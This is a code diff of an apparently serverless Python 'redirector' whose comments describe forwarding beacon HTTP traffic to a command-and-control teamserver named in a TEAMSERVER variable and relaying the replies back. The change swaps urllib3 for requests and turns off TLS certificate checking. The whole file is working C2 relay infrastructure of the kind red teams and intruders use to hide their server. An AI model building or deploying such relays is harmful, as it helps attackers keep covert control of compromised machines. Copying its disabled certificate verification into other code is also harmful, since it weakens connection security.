@@ -1,8 +1,6 @@
 import base64
 import os
-import urllib3
-
-from pprint import pprint
+import requests
 
 
 def redirector(event, context):
@@ -12,8 +10,6 @@ def redirector(event, context):
     #######
     # Forward HTTP request to C2
     #######
-
-    http = urllib3.PoolManager(cert_reqs = 'CERT_NONE')
 
     # Setup forwarding URL
     teamserver = os.getenv("TEAMSERVER")
@@ -39,7 +35,14 @@ def redirector(event, context):
             body = event["body"]
 
     # Forward request to C2
-    resp = http.request(event["requestContext"]["http"]["method"], url, headers=inboundHeaders, fields=queryStrings, body=body)
+    requests.packages.urllib3.disable_warnings() 
+    
+    if event["requestContext"]["http"]["method"] == "GET":
+        resp = requests.get(url, headers=inboundHeaders, params=queryStrings, verify=False)
+    elif event["requestContext"]["http"]["method"] == "POST":
+        resp = requests.post(url, headers=inboundHeaders, params=queryStrings, data=body, verify=False)
+    else:
+        return "ERROR: INVALID REQUEST METHOD! Must be POST or GET"
 
     ########
     # Return response to beacon
@@ -47,13 +50,14 @@ def redirector(event, context):
 
     # Parse outbound HTTP headers
     outboundHeaders = {}
-    for i in range(len(resp.headers.items())):
-        outboundHeaders[resp.headers.items()[i][0]] = resp.headers.items()[i][1]
+    
+    for head, val in resp.headers.items():
+        outboundHeaders[head] = val
 
     # build response to beacon
     response = {
-        "statusCode": resp.status,
-        "body": resp.data.decode('utf-8'),
+        "statusCode": resp.status_code,
+        "body": resp.text,
         "headers": outboundHeaders
     }
 
